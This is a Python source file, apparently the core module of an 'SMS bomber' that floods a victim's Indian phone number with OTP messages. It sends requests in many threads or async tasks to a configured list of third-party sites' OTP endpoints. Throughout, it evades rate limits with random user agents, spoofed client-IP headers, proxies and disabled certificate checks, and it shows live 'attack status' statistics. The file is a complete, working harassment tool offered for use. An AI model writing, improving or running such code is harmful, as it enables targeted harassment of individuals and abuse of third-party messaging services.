#!/usr/bin/env python3
"""
SMS Bomber Core Module
Handles multi-threaded SMS bombing with live statistics
"""

import requests
import threading
import time
import random
import asyncio
from datetime import datetime
from typing import Dict, List, Callable, Optional
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from config import (
    TARGET_SITES, USER_AGENTS, THREADS_PER_SITE, 
    DELAY_BETWEEN_REQUESTS, USE_PROXIES, PROXIES
)


class SMSBomber:
    """Main SMS Bomber Class"""
    
    def __init__(self, phone_number: str, total_attempts: int, progress_callback: Optional[Callable] = None):
        self.phone_number = phone_number
        self.total_attempts = total_attempts
        self.progress_callback = progress_callback
        
        # Statistics
        self.stats = {
            "total_sent": 0,
            "successful": 0,
            "failed": 0,
            "start_time": None,
            "end_time": None,
            "site_stats": {},
            "is_running": False,
            "current_site": "",
        }
        
        self.stats_lock = threading.Lock()
        self.stop_event = threading.Event()
        self.threads = []
        
    def format_phone_number(self, format_type: str = "with_plus") -> str:
        """Format phone number in various ways"""
        clean = self.phone_number.replace("+", "").replace(" ", "").replace("-", "")
        
        if format_type == "with_plus":
            return f"+{clean}"
        elif format_type == "plain":
            return clean
        elif format_type == "with_91":
            return f"91{clean[-10:]}"
        elif format_type == "with_0":
            return f"0{clean[-10:]}"
        elif format_type == "last_10":
            return clean[-10:]
        return self.phone_number
    
    def get_random_headers(self) -> Dict:
        """Generate random headers for evasion"""
        ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9", "hi-IN,hi;q=0.9,en;q=0.8"]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "X-Forwarded-For": ip,
            "X-Real-IP": ip,
            "X-Client-IP": ip,
            "CF-Connecting-IP": ip,
            "Referer": random.choice([
                "https://www.google.com/",
                "https://www.facebook.com/",
                "https://www.instagram.com/",
                "https://www.youtube.com/",
            ]),
            "Origin": "https://www.google.com",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "DNT": "1",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }
    
    def get_proxy(self) -> Optional[Dict]:
        """Get random proxy if enabled"""
        if USE_PROXIES and PROXIES:
            proxy = random.choice(PROXIES)
            return {"http": proxy, "https": proxy}
        return None
    
    def update_payload(self, payload: Dict) -> Dict:
        """Update payload with phone number in various formats"""
        new_payload = {}
        formats = {
            "{number}": self.format_phone_number("with_plus"),
            "{number_plain}": self.format_phone_number("plain"),
            "{number_91}": self.format_phone_number("with_91"),
            "{number_0}": self.format_phone_number("with_0"),
            "{number10}": self.format_phone_number("last_10"),
        }
        
        for key, value in payload.items():
            if isinstance(value, str):
                for placeholder, phone_format in formats.items():
                    value = value.replace(placeholder, phone_format)
            new_payload[key] = value
        
        return new_payload
    
    def send_otp_request(self, site: Dict) -> bool:
        """Send OTP request to a specific site"""
        try:
            if self.stop_event.is_set():
                return False
            
            name = site["name"]
            url = site["url"]
            method = site.get("method", "POST")
            payload = self.update_payload(site.get("payload", {}))
            custom_headers = site.get("headers", {})
            
            # Update current site
            with self.stats_lock:
                self.stats["current_site"] = name
            
            # Merge headers
            headers = self.get_random_headers()
            headers.update(custom_headers)
            
            # Add random delay
            time.sleep(random.uniform(0.1, DELAY_BETWEEN_REQUESTS))
            
            # Prepare request
            proxy = self.get_proxy()
            
            # Try different request methods
            try:
                if method.upper() == "GET":
                    response = requests.get(
                        url, 
                        params=payload, 
                        headers=headers, 
                        proxies=proxy, 
                        timeout=10,
                        verify=False
                    )
                else:
                    # Determine content type
                    if headers.get("Content-Type") == "application/json":
                        response = requests.post(
                            url, 
                            json=payload, 
                            headers=headers, 
                            proxies=proxy, 
                            timeout=10,
                            verify=False
                        )
                    else:
                        response = requests.post(
                            url, 
                            data=payload, 
                            headers=headers, 
                            proxies=proxy, 
                            timeout=10,
                            verify=False
                        )
                
                # Check if successful
                success = response.status_code in [200, 201, 202, 204]
                
                # Update statistics
                with self.stats_lock:
                    self.stats["total_sent"] += 1
                    if success:
                        self.stats["successful"] += 1
                    else:
                        self.stats["failed"] += 1
                    
                    if name not in self.stats["site_stats"]:
                        self.stats["site_stats"][name] = {"sent": 0, "success": 0, "failed": 0}
                    
                    self.stats["site_stats"][name]["sent"] += 1
                    if success:
                        self.stats["site_stats"][name]["success"] += 1
                    else:
                        self.stats["site_stats"][name]["failed"] += 1
                
                # Call progress callback
                if self.progress_callback:
                    try:
                        self.progress_callback(self.get_stats())
                    except:
                        pass
                
                return success
                
            except requests.exceptions.Timeout:
                with self.stats_lock:
                    self.stats["total_sent"] += 1
                    self.stats["failed"] += 1
                return False
            except requests.exceptions.ConnectionError:
                with self.stats_lock:
                    self.stats["total_sent"] += 1
                    self.stats["failed"] += 1
                return False
                    
        except Exception as e:
            with self.stats_lock:
                self.stats["total_sent"] += 1
                self.stats["failed"] += 1
            return False
    
    def worker(self, sites: List[Dict], attempts_per_site: int):
        """Worker thread for sending OTPs"""
        for _ in range(attempts_per_site):
            if self.stop_event.is_set():
                break
            
            for site in sites:
                if self.stop_event.is_set():
                    break
                
                self.send_otp_request(site)
                
                # Small delay between requests
                time.sleep(random.uniform(0.1, 0.3))
    
    def start_attack(self) -> None:
        """Start the SMS bombing attack"""
        self.stats["start_time"] = time.time()
        self.stats["is_running"] = True
        self.stop_event.clear()
        
        # Calculate attempts per site
        total_sites = len(TARGET_SITES)
        attempts_per_site = max(1, self.total_attempts // (total_sites * THREADS_PER_SITE))
        
        # Create and start threads
        self.threads = []
        
        # Distribute sites among threads
        sites_per_thread = total_sites // (THREADS_PER_SITE * 2)
        
        for i in range(0, total_sites, sites_per_thread):
            sites_batch = TARGET_SITES[i:i + sites_per_thread]
            
            for _ in range(THREADS_PER_SITE):
                t = threading.Thread(target=self.worker, args=(sites_batch, attempts_per_site))
                t.daemon = True
                t.start()
                self.threads.append(t)
        
        # Monitor completion
        while self.stats["total_sent"] < self.total_attempts and not self.stop_event.is_set():
            time.sleep(1)
        
        # Stop if limit reached
        self.stop()
    
    def stop(self) -> None:
        """Stop the attack"""
        self.stop_event.set()
        self.stats["is_running"] = False
        self.stats["end_time"] = time.time()
        
        # Wait for threads to finish
        for t in self.threads:
            try:
                t.join(timeout=2)
            except:
                pass
    
    def get_stats(self) -> Dict:
        """Get current statistics"""
        with self.stats_lock:
            stats_copy = self.stats.copy()
            
            # Calculate duration
            if stats_copy["start_time"]:
                if stats_copy["end_time"]:
                    stats_copy["duration"] = stats_copy["end_time"] - stats_copy["start_time"]
                else:
                    stats_copy["duration"] = time.time() - stats_copy["start_time"]
            else:
                stats_copy["duration"] = 0
            
            # Calculate progress
            if self.total_attempts > 0:
                stats_copy["progress"] = (stats_copy["total_sent"] / self.total_attempts) * 100
            else:
                stats_copy["progress"] = 0
            
            # Calculate rate
            if stats_copy["duration"] > 0:
                stats_copy["rate"] = stats_copy["total_sent"] / stats_copy["duration"]
            else:
                stats_copy["rate"] = 0
            
            return stats_copy
    
    def get_progress_bar(self, length: int = 20) -> str:
        """Generate a progress bar"""
        stats = self.get_stats()
        progress = stats["progress"] / 100
        filled = int(length * progress)
        bar = "█" * filled + "░" * (length - filled)
        return f"[{bar}] {stats['progress']:.1f}%"
    
    def format_stats_message(self) -> str:
        """Format statistics for display"""
        stats = self.get_stats()
        
        message = f"""
📊 LIVE ATTACK STATUS

{self.get_progress_bar()}

📱 Target: `{self.phone_number}`
📤 Total Sent: {stats['total_sent']}/{self.total_attempts}
✅ Successful: {stats['successful']}
❌ Failed: {stats['failed']}
⚡ Rate: {stats['rate']:.1f} SMS/sec
⏱ Duration: {stats['duration']:.1f}s
🌐 Current: {stats['current_site'][:20] if stats['current_site'] else 'Idle'}

Updated: {datetime.now().strftime('%H:%M:%S')}
"""
        return message


class AsyncSMSBomber(SMSBomber):
    """Async version of SMS Bomber for better performance"""
    
    async def send_otp_request_async(self, site: Dict, session: requests.Session) -> bool:
        """Send OTP request asynchronously"""
        try:
            if self.stop_event.is_set():
                return False
            
            name = site["name"]
            url = site["url"]
            method = site.get("method", "POST")
            payload = self.update_payload(site.get("payload", {}))
            custom_headers = site.get("headers", {})
            
            # Update current site
            with self.stats_lock:
                self.stats["current_site"] = name
            
            # Merge headers
            headers = self.get_random_headers()
            headers.update(custom_headers)
            
            # Add random delay
            await asyncio.sleep(random.uniform(0.1, DELAY_BETWEEN_REQUESTS))
            
            # Run request in thread pool
            loop = asyncio.get_event_loop()
            
            def make_request():
                try:
                    if method.upper() == "GET":
                        return session.get(url, params=payload, headers=headers, timeout=10, verify=False)
                    else:
                        if headers.get("Content-Type") == "application/json":
                            return session.post(url, json=payload, headers=headers, timeout=10, verify=False)
                        else:
                            return session.post(url, data=payload, headers=headers, timeout=10, verify=False)
                except Exception as e:
                    return None
            
            response = await loop.run_in_executor(None, make_request)
            
            if response is None:
                with self.stats_lock:
                    self.stats["total_sent"] += 1
                    self.stats["failed"] += 1
                return False
            
            success = response.status_code in [200, 201, 202, 204]
            
            # Update statistics
            with self.stats_lock:
                self.stats["total_sent"] += 1
                if success:
                    self.stats["successful"] += 1
                else:
                    self.stats["failed"] += 1
                
                if name not in self.stats["site_stats"]:
                    self.stats["site_stats"][name] = {"sent": 0, "success": 0, "failed": 0}
                
                self.stats["site_stats"][name]["sent"] += 1
                if success:
                    self.stats["site_stats"][name]["success"] += 1
                else:
                    self.stats["site_stats"][name]["failed"] += 1
            
            # Call progress callback
            if self.progress_callback:
                try:
                    await self.progress_callback(self.get_stats())
                except:
                    pass
            
            return success
            
        except Exception as e:
            with self.stats_lock:
                self.stats["total_sent"] += 1
                self.stats["failed"] += 1
            return False
    
    async def start_attack_async(self) -> None:
        """Start async attack"""
        self.stats["start_time"] = time.time()
        self.stats["is_running"] = True
        self.stop_event.clear()
        
        # Create session
        session = requests.Session()
        session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
        })
        
        # Calculate attempts per site
        attempts_per_site = max(1, self.total_attempts // len(TARGET_SITES))
        
        # Create tasks
        tasks = []
        for site in TARGET_SITES:
            for _ in range(min(attempts_per_site, 3)):  # Limit concurrent per site
                if self.stats["total_sent"] >= self.total_attempts:
                    break
                task = asyncio.create_task(self.send_otp_request_async(site, session))
                tasks.append(task)
        
        # Wait for all tasks
        await asyncio.gather(*tasks, return_exceptions=True)
        
        self.stop()


def validate_phone_number(number: str) -> tuple[bool, str]:
    """Validate phone number format"""
    # Remove all non-digit characters
    clean = ''.join(filter(str.isdigit, number))
    
    # Check if it's an Indian number
    if len(clean) == 10:
        # Assume Indian number without country code
        return True, f"+91{clean}"
    elif len(clean) == 12 and clean.startswith("91"):
        # With 91 prefix
        return True, f"+{clean}"
    elif len(clean) == 13 and clean.startswith("91"):
        # With +91
        return True, f"+{clean}"
    else:
        return False, "Invalid phone number. Please use Indian numbers only."


# Test function
if __name__ == "__main__":
    # Test the bomber
    bomber = SMSBomber("+919999999999", 10)
    print("Testing SMS Bomber...")
    print(bomber.format_stats_message())
